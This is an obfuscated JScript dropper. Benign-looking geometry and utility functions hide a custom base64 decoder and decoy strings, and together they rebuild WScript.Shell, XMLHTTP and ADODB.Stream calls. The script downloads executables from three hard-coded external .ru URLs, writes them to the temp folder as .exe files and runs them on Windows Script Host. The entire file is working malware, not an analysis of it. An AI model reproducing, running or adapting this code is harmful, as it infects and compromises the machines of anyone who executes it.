var handbook = 0;
var portend = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  overshadow = [];
var budget = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function spies(focused) {
	annotated = focused;
	for (var i in budget){annotated = annotated.replace(i, budget[i]);}
    return annotated;
};

var insatiable = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.spies4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("cooked").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = portend[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = portend[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = portend[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = portend[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var woodlands ="cookedJVcookedRFTVcookedAl".spies4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var jewellery = "cookedQWcookedN0aXZcookedlWE9iacookedmVjdA=cooked=".spies4();
String.prototype.spies2 = function () {
    var rampant = {
        exhaust: this
    };
    rampant.yourself = rampant.exhaust["c3Vic3RyaW5n".spies4()](handbook, insatiable);
    return rampant.yourself;
};

var letter ="cookedRXhwYW5cookedkRW52aXcookedJvbm1lbnRTdHJcookedpbmdz".spies4();
var Native = function(options){
	
};
var endowment = [jewellery, letter,woodlands,  ""+"."+("festivity","maneuver","weblog","firmware","piracy","hazard","dealer","gauge","exe"), "UnVu".spies4(), spies("M"+"SX"+"ML"+("advocacy","vestige","hypnotized","pharmacy","charge","record","mobility","2.")+"|M"+"LH"+"TT"+("tableau","support","thumping","validity","fallen","outlaw","businesslike","slovak","P>")+"WU"+("propeller","anent","ceres","incomparable","inspired","toolkit","whiles","cr")+("suggestion","proven","photographic","knowing","complementary","barnet","becomes","workings","ip")+"t:"+("ceremony","garland","windsor","karaoke","unctuous","motion","controversy","pages","Sh")+"ell")];
amendments = "_F2_";
var control = this[endowment.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
vtTsMzcaba = "bGWkYHPowGa";
nominated = (("sleet", "glorification", "donor", "racing", "prospector", "spruce", "hasan", "pruoqhJpqFSG") + "NjGRYjLVq").spies2();
conjunctions = (("decrepitude", "norfolk", "acids", "frank", "harold", "earthquake", "longwinded", "constituent", "taketh", "scccEsJXTH") + "uvCXxj").spies2();
  
    String.prototype.immediate = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var essay = endowment.pop().split(">");

totem = "b3Blbg==".spies4();
var embody = new control(essay[1]);
qLItiYsvPbX = "_F3_";
var bradford = new control(essay[0]);
var snowball = embody[endowment.shift()](endowment.shift());
weasel = (("added", "consultant", "danger", "aromatic", "EmUeFKrm") + "CqEsKkC").spies2();

var taboo = endowment.shift();
var lustful = endowment.shift();
function existence(shutter, company) {

    try {
        var remedies = snowball + "/" + company ;
		remedies = remedies+ taboo;
            bradford[totem](("warming","savour","G" + weasel) + ("bulwark","warble","textbooks","immigration","T"), shutter, false);
       
    sGItPpu = "_F7_";
    bradford[conjunctions + ("overwhelm","gelatine","end")]();
	var perfidy=(WScript+"nominated"=="V2luZG93cyBTY3JpcHQgSG9zdA==".spies4()+"nominated")&&bradford["c3RhdHVz".spies4()] +""=="MjAw".spies4()&&typeof(GlSdIjC)==="undefined";
	lQHNgR = "_F8_";
    if (perfidy) {
		
        var halcyon = new control((("stages","agreements","stranger","southeastern","shopper","wednesday","sequences","findings","A")+("evening","governmental","citizenship","outing","preservation","permissions","trends","bookseller","SEOO")+"DB"+("yawned","odium","immaculate","cocoa","producer","abbot","kelly",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        halcyon[totem]();
        aFuiqOQFl = "_F9_";
        halcyon.type = insatiable;
        qagqHWvjcis = "_F10_";
        halcyon["d3JpdGU=".spies4()](bradford[("greenland","abbreviation","aweinspiring","amaryllis","harvest","stellar","aurora","")+"R"+"es"+"pon"+budget['U'].toLowerCase()+"e"+"Qm9keQ==".spies4()]);
        xWzSYyyjE = "_F11_";
        halcyon[(nominated + "o"+("sprouted","restrict","toshiba","press","navigating","learned","orthodoxy","terracotta","00")+("masturbation","rectitude","culpable","realtor","shrub","tanner","seaboard","8i")+"tion").replace("0"+("oppressor","movie","threaded","leaven","milliner","objectives","sensor","08"), conjunctions)] = 0;
        MWsfPuRC = "_F12_";
        halcyon[("minister","popish","internet","makers","meters","instructional","concubine","s")+"aveT"+"oF"+"ile"](remedies, 2);
        ciUXueqDVG = "_F13_";
        halcyon.close();
        gtpviwHw = "_F14_";
		embody[lustful](remedies, insatiable, true);
    }
} catch (rgbpWmjXCh) { };

    rzspvB = "_F15_";
}
try{
existence("aHR0cDovLw==".spies4()+"\u0061\u0062\u0061\u006C\u0061\u006B\u006F\u0076\u002E\u0072"+"\u0075\u002F\u0032\u0033\u0072\u0032\u0033\u0066\u0034\u0032" + "?fOIUCBfnsGW=sLuMxUgFbhT","aNFhFbYa");}catch(yCHhvDzjJ){}

try{
existence("aHR0cDovLw==".spies4()+"\u0072\u0063\u0066\u0061\u006E\u0073\u002E\u0072\u0075"+"\u002F\u0033\u0034\u0074\u0067\u0074\u0062\u0076\u0063\u0071" + "?BbFNoVMUtoU=XTqTNVXGrHV","TjLEbrG");}catch(rnsruaqk){}
existence("aHR0cDovLw==".spies4()+"\u0061\u0064\u006D\u002E\u0072\u0062\u0063\u002E\u0065\u0078\u0070\u006F\u0063\u0065\u006E"+"\u0074\u0072\u002E\u0072\u0075\u002F\u0034\u0079\u0035\u0033\u0074\u0032\u0066\u0064\u0067\u0072" + "?gELJADNQAPD=cBSeoTf","hScGzFJ");
   YzMEMNlck = "_F16_";
   